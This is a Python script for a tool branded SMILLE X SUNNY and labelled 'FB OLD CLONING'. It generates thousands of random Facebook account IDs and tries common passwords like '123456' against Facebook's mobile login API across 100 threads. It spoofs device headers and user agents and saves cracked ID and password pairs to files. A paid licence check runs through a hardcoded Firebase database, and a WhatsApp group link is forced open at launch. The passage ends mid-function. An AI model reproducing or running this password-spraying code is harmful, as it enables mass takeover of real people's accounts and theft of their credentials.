#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests
import subprocess
import shutil
import uuid
import hashlib
import platform
import json
import random
import re
import webbrowser
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from pyfiglet import Figlet
from colorama import init

# ==================== INIT COLORAMA ====================
init(autoreset=True)

# ==================== PREMIUM VIP COLORS ====================
GREEN  = "\033[92m"
YELLOW = "\033[1;38;5;226m"
BLUE   = "\033[1;38;5;39m"
WHITE  = "\033[97m"
CYAN   = "\033[1;38;5;51m"
MAGENTA = "\033[1;38;5;201m"
GREEN_OK = "\033[92m"
RED    = "\033[1;38;5;196m"
RESET  = "\033[0m"

# ==================== WHATSAPP GROUP LINK ====================
WHATSAPP_GROUP = "https://chat.whatsapp.com/F6Uopbqrdc10HT3Q3sQyQE?s=cl&p=a&ilr=4"

# ==================== PREMIUM BANNER ====================
def show_banner():
    os.system("clear" if os.name != "nt" else "cls")
    
    try:
        terminal_width = os.get_terminal_size().columns
    except:
        terminal_width = 80
    
    try:
        fig = Figlet(font="doom", width=terminal_width)
    except:
        fig = Figlet(font="standard", width=terminal_width)
    
    smille_art = fig.renderText("SMILLE")
    x_art = "                 X"
    sunny_art = fig.renderText("SUNNY")
    
    print(GREEN + "=" * min(terminal_width, 70))
    
    for line in smille_art.split("\n"):
        if line.strip():
            print(GREEN + line)
    
    print(WHITE + x_art.center(terminal_width))
    
    for line in sunny_art.split("\n"):
        if line.strip():
            print(GREEN + line)
    
    print(GREEN + "=" * min(terminal_width, 70))
    
    border_width = min(terminal_width - 2, 60)
    print("\n" + GREEN + "╔" + "═" * border_width + "╗")
    
    info_lines = [
        f"{YELLOW}OWNER      ➜ {WHITE}𝑺𝑴𝑰𝑳𝑳𝑬 𝑿 𝑺𝑼𝑵𝑵𝒀",
        f"{YELLOW}GITHUB     ➜ {WHITE}𝑺𝑴𝑰𝑳𝑳𝑬 𝑿 𝑺𝑼𝑵𝑵𝒀",
        f"{YELLOW}TOOLS      ➜ {WHITE}FB OLD CLONING",
        f"{YELLOW}WHATSAPP   ➜ {WHITE}+92 312 5496445",
        f"{YELLOW}STATUS     ➜ {GREEN}PREMIUM",
        f"{YELLOW}VERSION    ➜ {WHITE}18"
    ]
    
    for line in info_lines:
        clean_line = re.sub(r'\033\[[0-9;]*m', '', line)
        if len(clean_line) < border_width - 4:
            padding = (border_width - 4 - len(clean_line)) // 2
            print(GREEN + "  " + " " * padding + line + " " * padding)
        else:
            print(GREEN + "  " + line)
    
    print(GREEN + "╠" + "═" * border_width + "╣")
    
    no_love_line = f"{YELLOW}⚔️  NO LOVE • NO FEAR ⚔️"
    clean_no_love = re.sub(r'\033\[[0-9;]*m', '', no_love_line)
    if len(clean_no_love) < border_width - 4:
        padding = (border_width - 4 - len(clean_no_love)) // 2
        print(GREEN + "  " + " " * padding + no_love_line + " " * padding)
    else:
        print(GREEN + "  " + no_love_line)
    
    print(GREEN + "╚" + "═" * border_width + "╝" + RESET)
    print()

# ==================== BANNER ANIMATION ====================
def banner_animation():
    os.system("clear" if os.name != "nt" else "cls")
    
    try:
        terminal_width = os.get_terminal_size().columns
    except:
        terminal_width = 80
    
    for i in range(101):
        os.system("clear" if os.name != "nt" else "cls")
        print(GREEN + "SMILLE × SUNNY BOOTING...\n")
        print(f"[{'█'*(i//2)}{' '*(50-i//2)}] {i}%")
        time.sleep(0.01)
    
    os.system("clear" if os.name != "nt" else "cls")
    
    try:
        fig = Figlet(font="doom", width=terminal_width)
    except:
        fig = Figlet(font="standard", width=terminal_width)
    
    smille_art = fig.renderText("SMILLE")
    x_art = "                 X"
    sunny_art = fig.renderText("SUNNY")
    
    print(GREEN + "=" * min(terminal_width, 70))
    for line in smille_art.split("\n"):
        if line.strip():
            print(GREEN + line)
    
    print(WHITE + x_art.center(terminal_width))
    
    for line in sunny_art.split("\n"):
        if line.strip():
            print(GREEN + line)
    
    print(GREEN + "=" * min(terminal_width, 70))
    
    border_width = min(terminal_width - 2, 60)
    print("\n" + GREEN + "╔" + "═" * border_width + "╗")
    
    info_lines = [
        f"{YELLOW}OWNER      ➜ {WHITE}𝑺𝑴𝑰𝑳𝑳𝑬 𝑿 𝑺𝑼𝑵𝑵𝒀",
        f"{YELLOW}GITHUB     ➜ {WHITE}𝑺𝑴𝑰𝑳𝑳𝑬 𝑿 𝑺𝑼𝑵𝑵𝒀",
        f"{YELLOW}TOOLS      ➜ {WHITE}FB OLD CLONING",
        f"{YELLOW}WHATSAPP   ➜ {WHITE}+92 312 5496445",
        f"{YELLOW}STATUS     ➜ {GREEN}PREMIUM",
        f"{YELLOW}VERSION    ➜ {WHITE}18"
    ]
    
    for line in info_lines:
        clean_line = re.sub(r'\033\[[0-9;]*m', '', line)
        if len(clean_line) < border_width - 4:
            padding = (border_width - 4 - len(clean_line)) // 2
            print(GREEN + "  " + " " * padding + line + " " * padding)
        else:
            print(GREEN + "  " + line)
    
    print(GREEN + "╠" + "═" * border_width + "╣")
    
    no_love_line = f"{YELLOW}⚔️  NO LOVE • NO FEAR ⚔️"
    clean_no_love = re.sub(r'\033\[[0-9;]*m', '', no_love_line)
    if len(clean_no_love) < border_width - 4:
        padding = (border_width - 4 - len(clean_no_love)) // 2
        print(GREEN + "  " + " " * padding + no_love_line + " " * padding)
    else:
        print(GREEN + "  " + no_love_line)
    
    print(GREEN + "╚" + "═" * border_width + "╝" + RESET)
    print()
    
    print(GREEN + "-" * 70)
    print(GREEN + "✓ System Ready!")
    time.sleep(0.2)
    print(GREEN + "🚀 Launching SMILLE X SUNNY TOOL...")
    time.sleep(0.3)

# ==================== WHATSAPP OPEN - 8 METHODS FOR TERMUX ====================
def open_whatsapp_8methods():
    """Open WhatsApp using 8 different methods - Works on Termux"""
    print(GREEN + "\n" + "=" * 50)
    print(GREEN + "  [*] OPENING WHATSAPP GROUP")
    print(GREEN + "=" * 50)
    
    print(GREEN + "\n  [*] Trying 8 methods to open WhatsApp...")
    
    opened = False
    
    # Method 1: termux-open-url (BEST FOR TERMUX)
    try:
        os.system(f"termux-open-url '{WHATSAPP_GROUP}' > /dev/null 2>&1 &")
        print(GREEN + "    ✓ Method 1: termux-open-url attempted")
        opened = True
    except:
        pass
    
    # Method 2: am start (Android Intent)
    try:
        os.system(f"am start -a android.intent.action.VIEW -d '{WHATSAPP_GROUP}' > /dev/null 2>&1 &")
        print(GREEN + "    ✓ Method 2: Android Intent attempted")
        opened = True
    except:
        pass
    
    # Method 3: xdg-open (Linux)
    try:
        os.system(f"xdg-open '{WHATSAPP_GROUP}' > /dev/null 2>&1 &")
        print(GREEN + "    ✓ Method 3: xdg-open attempted")
        opened = True
    except:
        pass
    
    # Method 4: webbrowser (Python default)
    try:
        webbrowser.open(WHATSAPP_GROUP)
        print(GREEN + "    ✓ Method 4: webbrowser attempted")
        opened = True
    except:
        pass
    
    # Method 5: subprocess with termux-open-url
    try:
        subprocess.Popen(['termux-open-url', WHATSAPP_GROUP], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(GREEN + "    ✓ Method 5: subprocess termux attempted")
        opened = True
    except:
        pass
    
    # Method 6: subprocess with am start
    try:
        subprocess.Popen(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', WHATSAPP_GROUP],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(GREEN + "    ✓ Method 6: subprocess am attempted")
        opened = True
    except:
        pass
    
    # Method 7: Browser commands
    try:
        browsers = ['chromium-browser', 'google-chrome', 'firefox', 'brave-browser']
        for browser in browsers:
            try:
                subprocess.Popen([browser, WHATSAPP_GROUP], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(GREEN + f"    ✓ Method 7: {browser} attempted")
                opened = True
                break
            except:
                continue
    except:
        pass
    
    # Method 8: System open
    try:
        if os.name == 'nt':
            os.system(f"start {WHATSAPP_GROUP}")
        elif sys.platform == 'darwin':
            os.system(f"open '{WHATSAPP_GROUP}'")
        else:
            os.system(f"open '{WHATSAPP_GROUP}' > /dev/null 2>&1 &")
        print(GREEN + "    ✓ Method 8: system open attempted")
        opened = True
    except:
        pass
    
    if opened:
        print(GREEN + "\n  [✓] WhatsApp opening attempted in background!")
    else:
        print(YELLOW + "\n  [!] Could not open automatically")
    
    print(YELLOW + "  [!] If it doesn't open, please open manually:")
    print(GREEN + f"      {WHATSAPP_GROUP}")
    print(GREEN + "=" * 50 + "\n")
    time.sleep(0.2)

# ==================== FIREBASE CONFIG ====================
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyB-FZmr6QwN1OcjQLIwUBIVWaXyxX6IrWY",
    "authDomain": "telegramapp-7aba7.firebaseapp.com",
    "databaseURL": "https://telegramapp-7aba7-default-rtdb.firebaseio.com",
    "projectId": "telegramapp-7aba7",
    "storageBucket": "telegramapp-7aba7.firebasestorage.app",
    "messagingSenderId": "305916891883",
    "appId": "1:305916891883:web:7bfbf6dda293b7b30264ae"
}

# ==================== FIREBASE MANAGER ====================
class FirebaseManager:
    def __init__(self):
        self.db_url = FIREBASE_CONFIG["databaseURL"]

    def create_request(self, user_id, device_id, name):
        url = f"{self.db_url}/pending_requests.json"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = {
            "user_id": user_id,
            "device_id": device_id,
            "name": name,
            "timestamp": timestamp,
            "status": "pending"
        }
        try:
            response = requests.post(url, json=data, timeout=10)
            if response.status_code == 200:
                return True, "Request sent to admin"
            return False, "Failed to send request"
        except:
            return False, "Connection error"

    def get_request_status(self, device_id):
        url = f"{self.db_url}/pending_requests.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return None
            pending = response.json()
            if not pending:
                return None
            for req_id, req_data in pending.items():
                if req_data.get("device_id") == device_id:
                    return {
                        "request_id": req_id,
                        "status": req_data.get("status"),
                        "timestamp": req_data.get("timestamp"),
                        "name": req_data.get("name")
                    }
            return None
        except:
            return None

    def check_key(self, device_id):
        url = f"{self.db_url}/keys.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return None, None, None
            keys_data = response.json()
            if not keys_data:
                return None, None, None
            current_time = datetime.now()
            for key_data in keys_data.values():
                if key_data.get("device_id") == device_id and key_data.get("status") == "active":
                    expiry = datetime.fromisoformat(key_data.get("expiry"))
                    if expiry > current_time:
                        return key_data.get("key"), key_data.get("expiry"), key_data.get("name")
            return None, None, None
        except:
            return None, None, None

    def get_device_info(self, device_id):
        url = f"{self.db_url}/keys.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return None
            keys_data = response.json()
            if not keys_data:
                return None
            for key_id, key_data in keys_data.items():
                if key_data.get("device_id") == device_id:
                    return {
                        "key_id": key_id,
                        "device_id": device_id,
                        "user_id": key_data.get("user_id"),
                        "name": key_data.get("name"),
                        "key": key_data.get("key"),
                        "expiry": key_data.get("expiry"),
                        "status": key_data.get("status"),
                        "created": key_data.get("created")
                    }
            return None
        except:
            return None

    def get_key_status(self, device_id):
        url = f"{self.db_url}/keys.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return "no_key", None
            keys_data = response.json()
            if not keys_data:
                return "no_key", None
            for key_data in keys_data.values():
                if key_data.get("device_id") == device_id:
                    if key_data.get("status") == "active":
                        expiry = datetime.fromisoformat(key_data.get("expiry"))
                        if expiry > datetime.now():
                            return "active", key_data.get("expiry")
                        else:
                            return "expired", key_data.get("expiry")
                    else:
                        return "inactive", None
            return "no_key", None
        except:
            return "error", None

    def get_all_keys(self):
        url = f"{self.db_url}/keys.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}

    def delete_key_by_device(self, device_id):
        url = f"{self.db_url}/keys.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return False
            keys_data = response.json()
            if not keys_data:
                return False
            for key_id, key_data in keys_data.items():
                if key_data.get("device_id") == device_id:
                    delete_url = f"{self.db_url}/keys/{key_id}.json"
                    requests.delete(delete_url, timeout=10)
                    return True
            return False
        except:
            return False

# ==================== DEVICE ID ====================
def get_device_id():
    fallback = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".smille_device_id")
    if os.path.exists(fallback):
        with open(fallback, "r") as f:
            return f.read().strip()
    try:
        identifiers = []
        if os.path.exists("/etc/machine-id"):
            with open("/etc/machine-id", "r") as f:
                identifiers.append(f.read().strip())
        elif os.path.exists("/var/lib/dbus/machine-id"):
            with open("/var/lib/dbus/machine-id", "r") as f:
                identifiers.append(f.read().strip())
        identifiers.append(platform.node())
        identifiers.append(platform.machine())
        try:
            mac = uuid.getnode()
            identifiers.append(str(mac))
        except:
            pass
        combined = "|".join(identifiers)
        device_id = hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
    except:
        device_id = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:16].upper()
    with open(fallback, "w") as f:
        f.write(device_id)
    return device_id

# ==================== FILE FUNCTIONS ====================
def save_key_file(key, device_id, expiry, name=""):
    try:
        with open("/sdcard/key.txt", "w") as f:
            f.write("═══════════════════════════════════\n")
            f.write("     SMILLE × SUNNY KEY INFO\n")
            f.write("═══════════════════════════════════\n")
            f.write(f"Key: {key}\n")
            f.write(f"Device ID: {device_id}\n")
            f.write(f"Name: {name}\n")
            f.write(f"Expiry: {expiry}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("═══════════════════════════════════\n")
        return True
    except:
        try:
            with open("key.txt", "w") as f:
                f.write("═══════════════════════════════════\n")
                f.write("     SMILLE × SUNNY KEY INFO\n")
                f.write("═══════════════════════════════════\n")
                f.write(f"Key: {key}\n")
                f.write(f"Device ID: {device_id}\n")
                f.write(f"Name: {name}\n")
                f.write(f"Expiry: {expiry}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("═══════════════════════════════════\n")
            return True
        except:
            return False

def save_device_id_file(device_id):
    try:
        with open("/sdcard/device_id.txt", "w") as f:
            f.write("═══════════════════════════════════\n")
            f.write("     SMILLE × SUNNY DEVICE ID\n")
            f.write("═══════════════════════════════════\n")
            f.write(f"Device ID: {device_id}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("═══════════════════════════════════\n")
        return True
    except:
        try:
            with open("device_id.txt", "w") as f:
                f.write("═══════════════════════════════════\n")
                f.write("     SMILLE × SUNNY DEVICE ID\n")
                f.write("═══════════════════════════════════\n")
                f.write(f"Device ID: {device_id}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("═══════════════════════════════════\n")
            return True
        except:
            return False

def save_ok_file(uid, password, age, method):
    try:
        filename = f"/sdcard/SMILLE-X-SUNNY-ID-M{method}.txt"
        with open(filename, "a") as f:
            f.write(f"❖ SMILLE X SUNNY ❖ ID:{uid} ❖ PASS:{password} ❖ AGE:{age} ❖ M{method} ❖ OK\n")
        return True
    except:
        try:
            filename = f"SMILLE-X-SUNNY-ID-M{method}.txt"
            with open(filename, "a") as f:
                f.write(f"❖ SMILLE X SUNNY ❖ ID:{uid} ❖ PASS:{password} ❖ AGE:{age} ❖ M{method} ❖ OK\n")
            return True
        except:
            return False

def load_saved_key():
    try:
        with open("/sdcard/key.txt", "r") as f:
            content = f.read()
            for line in content.split('\n'):
                if line.startswith("Key: "):
                    return line.replace("Key: ", "").strip()
    except:
        try:
            with open("key.txt", "r") as f:
                content = f.read()
                for line in content.split('\n'):
                    if line.startswith("Key: "):
                        return line.replace("Key: ", "").strip()
        except:
            return None
    return None

# ==================== UTILITY FUNCTIONS ====================
def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def get_time_left(expiry):
    try:
        exp_date = datetime.fromisoformat(expiry)
        diff = exp_date - datetime.now()
        
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds // 60) % 60
        seconds = diff.seconds % 60
        
        if days < 0:
            return "EXPIRED", 0, 0, 0, 0
        
        return f"{days}d {hours:02d}h {minutes:02d}m {seconds:02d}s", days, hours, minutes, seconds
    except:
        return "Invalid", 0, 0, 0, 0

def format_expiry(expiry):
    try:
        exp_date = datetime.fromisoformat(expiry)
        return exp_date.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return expiry

# ==================== TOOL FUNCTIONS - FAST ====================
oks = []
loop = 0

def login_1(uid):
    global loop, oks
    try:
        session = requests.session()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=5).json()
            
            if 'session_key' in res:
                age = creationyear(uid)
                sys.stdout.write(f"\n{GREEN}❖ {WHITE}SMILLE X SUNNY {GREEN}❖ {BLUE}ID:{uid} {GREEN}❖ {BLUE}PASS:{pw} {GREEN}❖ {CYAN}AGE:{age} {GREEN}❖ {MAGENTA}M1 {GREEN}❖ {GREEN_OK}OK\n")
                sys.stdout.flush()
                save_ok_file(uid, pw, age, 1)
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                age = creationyear(uid)
                sys.stdout.write(f"\n{GREEN}❖ {WHITE}SMILLE X SUNNY {GREEN}❖ {BLUE}ID:{uid} {GREEN}❖ {BLUE}PASS:{pw} {GREEN}❖ {CYAN}AGE:{age} {GREEN}❖ {MAGENTA}M1 {GREEN}❖ {GREEN_OK}OK\n")
                sys.stdout.flush()
                save_ok_file(uid, pw, age, 1)
                oks.append(uid)
                break
        loop += 1
        # Update status line
        sys.stdout.write(f"\r{GREEN}[+] SMILLE X SUNNY OK ID-M1 ({loop}) (OK: {len(oks)})")
        sys.stdout.flush()
    except:
        loop += 1
        sys.stdout.write(f"\r{GREEN}[+] SMILLE X SUNNY OK ID-M1 ({loop}) (OK: {len(oks)})")
        sys.stdout.flush()

def login_2(uid):
    global loop, oks
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            try:
                with requests.Session() as session:
                    headers = {
                        'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                        'x-fb-sim-hni': str(random.randint(20000, 40000)),
                        'x-fb-net-hni': str(random.randint(20000, 40000)),
                        'x-fb-connection-quality': 'EXCELLENT',
                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                        'user-agent': window1(),
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-http-engine': 'Liger'
                    }
                    url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                    po = session.get(url, headers=headers, timeout=5).json()
                    if 'session_key' in str(po):
                        age = creationyear(uid)
                        sys.stdout.write(f"\n{GREEN}❖ {WHITE}SMILLE X SUNNY {GREEN}❖ {BLUE}ID:{uid} {GREEN}❖ {BLUE}PASS:{pw} {GREEN}❖ {CYAN}AGE:{age} {GREEN}❖ {MAGENTA}M2 {GREEN}❖ {GREEN_OK}OK\n")
                        sys.stdout.flush()
                        save_ok_file(uid, pw, age, 2)
                        oks.append(uid)
                        break
            except:
                pass
        loop += 1
        sys.stdout.write(f"\r{GREEN}[+] SMILLE X SUNNY - M2 ({loop}) (OK: {len(oks)})")
        sys.stdout.flush()
    except:
        loop += 1
        sys.stdout.write(f"\r{GREEN}[+] SMILLE X SUNNY - M2 ({loop}) (OK: {len(oks)})")
        sys.stdout.flush()

def old_One():
    user = []
    show_banner()
    print(GREEN + "       Old Code : 2010-2014")
    ask = input(YELLOW + "       SELECT : ")
    print(GREEN + "──────────────────────────────────────────")
    show_banner()
    print(GREEN + "       EXAMPLE : 20000 / 30000 / 99999")
    limit = input(YELLOW + "       SELECT : ")
    print(GREEN + "──────────────────────────────────────────")
    
    print(GREEN + "   [*] Generating IDs...")
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(GREEN + '        METHOD 1')
    print(GREEN + '       METHOD 2')
    print(GREEN + "──────────────────────────────────────────")
    meth = input(YELLOW + "       CHOICE (A/B): ").strip().upper()
    
    show_banner()
    print(GREEN + f"       TOTAL ID FROM CRACK : {limit}")
    print(YELLOW + "       USE AIRPLANE MOD FOR GOOD RESULT")
    print(GREEN + "──────────────────────────────────────────")
    
    print(GREEN + "\n🚀 Starting Clone Process...\n")
    
    # More threads for faster cloning
    with ThreadPoolExecutor(max_workers=100) as pool:
        futures = []
        for mal in user:
            uid = '10000' + mal
            if meth == 'A':
                futures.append(pool.submit(login_1, uid))
            elif meth == 'B':
                futures.append(pool.submit(login_2, uid))
            else:
                print(RED + "    [!] INVALID METHOD SELECTED")
                break
        
        # Wait for all to complete
        for future in as_completed(futures):
            pass

def old_Tow():
    user = []
    show_banner()
    print(GREEN + "       OLD CODE : 2010-2014")
    ask = input(YELLOW + "       SELECT : ")
    print(GREEN + "──────────────────────────────────────────")
    show_banner()
    print(GREEN + "       EXAMPLE : 20000 / 30000 / 99999")
    limit = input(YELLOW + "       SELECT : ")
    print(GREEN + "──────────────────────────────────────────")
    
    print(GREEN + "   [*] Generating IDs...")
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    print(GREEN + '       METHOD A')
    print(GREEN + '       METHOD B')
    print(GREEN + "──────────────────────────────────────────")
    meth = input(YELLOW + "       CHOICE (A/B): ").strip().upper()
    
    show_banner()
    print(GREEN + f"       TOTAL ID FROM CRACK : {limit}")
    print(YELLOW + "       USE AIRPLANE MOD FOR GOOD RESULT")
    print(GREEN + "──────────────────────────────────────────")
    
    print(GREEN + "\n🚀 Starting Clone Process...\n")
    
    with ThreadPoolExecutor(max_workers=100) as pool:
        futures = []
        for uid in user:
            if meth == 'A':
                futures.append(pool.submit(login_1, uid))
            elif meth == 'B':
                futures.append(pool.submit(login_2, uid))
            else:
                print(RED + "    [!] INVALID METHOD SELECTED")
                break
        
        for future in as_completed(futures):
            pass

def old_Tree():
    user = []
    show_banner()
    print(GREEN + "       OLD CODE : 2009-2010")
    ask = input(YELLOW + "       SELECT : ")
    print(GREEN + "──────────────────────────────────────────")
    show_banner()
    print(GREEN + "       EXAMPLE : 20000 / 30000 / 99999")
    limit = input(YELLOW + "       TOTAL ID COUNT : ")
    print(GREEN + "──────────────────────────────────────────")
    
    print(GREEN + "   [*] Generating IDs...")
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    print(GREEN + '       METHOD A')
    print(GREEN + '       METHOD B')
    print(GREEN + "──────────────────────────────────────────")
    meth = input(YELLOW + "       CHOICE (A/B): ").strip().upper()
    
    show_banner()
    print(GREEN + f"       TOTAL ID FROM CRACK : {limit}")
    print(YELLOW + "       HAR 5 MINT ME AEROPLANE MODE LGAO")
    print(GREEN + "──────────────────────────────────────────")
    
    print(GREEN + "\n🚀 Starting Clone Process...\n")
    
    with ThreadPoolExecutor(max_workers=100) as pool:
        futures = []
        for uid in user:
            if meth == 'A':
                futures.append(pool.submit(login_1, uid))
            elif meth == 'B':
                futures.append(pool.submit(login_2, uid))
            else:
                print(RED + "    [!] INVALID METHOD SELECTED")
                break
        
        for future in as_completed(futures):
            pass

# ==================== MAIN MENU ====================
def wait_for_approval(firebase, device_id):
    print(GREEN + "\n[⏳] Waiting for admin approval...")
    print(GREEN + "[⏳] Tool will auto-start when approved")
    print(GREEN + "[⏳] Press Ctrl+C to stop waiting\n")
    
    attempts = 0
    while True:
        try:
            time.sleep(5)
            attempts += 1
            
            status, expiry = firebase.get_key_status(device_id)
            
            if status == "active":
                key, exp, name = firebase.check_key(device_id)
                if key:
                    print(GREEN + "\n✅ Key Approved!")
                    print(GREEN + f"🔑 Key: {key}")
                    print(GREEN + f"👤 Name: {name}")
                    print(GREEN + f"⏰ Expiry: {format_expiry(exp)}")
                    save_key_file(key, device_id, exp, name)
                    print(GREEN + "⏳ Auto-starting tool in 3 seconds...")
                    time.sleep(3)
                    return True, key, exp, name
            
            pending = firebase.get_request_status(device_id)
            if not pending and status == "no_key":
                print(RED + "\n❌ Request was declined or deleted!")
                return False, None, None, None
            
            if attempts % 6 == 0:
                print(GREEN + f"[⏳] Still waiting... ({attempts*5}s elapsed)")
                
        except KeyboardInterrupt:
            print(RED + "\n\n[⏹] Stopped waiting.")
            return False, None, None, None
        except:
            continue

def main_menu():
    # Step 1: Banner Animation
    banner_animation()
    
    # Step 2: WhatsApp Link - 8 Methods (SIRF YAHAN)
    open_whatsapp_8methods()
    
    # Step 3: Show Banner and Check Key
    show_banner()
    device_id = get_device_id()
    firebase = FirebaseManager()
    
    save_device_id_file(device_id)
    status, expiry = firebase.get_key_status(device_id)
    pending_req = firebase.get_request_status(device_id)
    
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(GREEN + f"  Device ID: {device_id}")
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    if status == "active":
        key, exp, name = firebase.check_key(device_id)
        if key:
            save_key_file(key, device_id, exp, name)
